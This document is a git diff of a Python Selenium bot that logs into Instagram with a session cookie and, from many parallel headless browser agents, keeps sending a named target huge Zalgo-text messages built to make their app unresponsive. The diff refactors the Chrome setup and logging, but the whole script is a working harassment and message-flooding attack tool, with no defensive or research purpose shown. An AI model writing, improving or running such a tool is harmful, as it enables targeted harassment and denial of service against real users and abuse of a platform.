@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER NC (10-AGENT MATRIX)
-# 📅 STATUS: 200 OVERRIDES | 80-MARK ZALGO | MANUAL BLITZ
+# 🚀 PROJECT: PRAVEER PAPA - 10 AGENT MATRIX
+# 📅 STATUS: 200 OVERRIDES | 80-MARK ZALGO | MAX IMPACT
 
 import os, time, random, threading, sys, gc, tempfile, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -36,28 +36,12 @@ def get_matrix_payload(target_name):
     lines.append(bloat + "\n🛑 SYSTEM UNRESPONSIVE 🛑")
     return "\n".join(lines)
 
-def log_status(agent_id, msg):
-    print(f"[M{MACHINE_ID}-A{agent_id}] {msg}", flush=True)
-
-def get_driver(agent_id):
-    chrome_options = Options()
-    chrome_options.add_argument("--headless=new")
-    chrome_options.add_argument("--no-sandbox")
-    chrome_options.add_argument("--disable-dev-shm-usage")
-    chrome_options.add_argument("--window-size=1920,1080")
-    chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36")
-    
-    temp_dir = os.path.join(tempfile.gettempdir(), f"matrix_{MACHINE_ID}_{agent_id}")
-    chrome_options.add_argument(f"--user-data-dir={temp_dir}")
-    return webdriver.Chrome(options=chrome_options)
-
 def run_life_cycle(agent_id, cookie, target_id, target_name):
     while True:
         driver = None
         session_start = time.time()
         try:
-            log_status(agent_id, "🚀 DEPLOYING MATRIX AGENT...")
-            driver = get_driver(agent_id)
+            driver = webdriver.Chrome(options=chrome_options)
             driver.get("https://www.instagram.com/")
             driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
             driver.refresh()
@@ -75,7 +59,7 @@ def run_life_cycle(agent_id, cookie, target_id, target_name):
                         el.dispatchEvent(new Event('input', { bubbles: true }));
                     """, box, payload)
                     box.send_keys(Keys.ENTER)
-                    log_status(agent_id, f"🔥 IMPACT SENT | {target_name.upper()} OWNED")
+                    print(f"[M{MACHINE_ID}-A{agent_id}] IMPACT SENT")
                     time.sleep(random.uniform(0.8, 1.5))
                 except:
                     time.sleep(3)
@@ -85,6 +69,14 @@ def run_life_cycle(agent_id, cookie, target_id, target_name):
             if driver: driver.quit()
             gc.collect()
             time.sleep(2)
+
+# Global Chrome Options
+chrome_options = Options()
+chrome_options.add_argument("--headless")
+chrome_options.add_argument("--no-sandbox")
+chrome_options.add_argument("--disable-dev-shm-usage")
+chrome_options.add_argument("--window-size=1920,1080")
+chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36")
 
 def main():
     cookie = os.environ.get("SESSION_ID", "").strip()
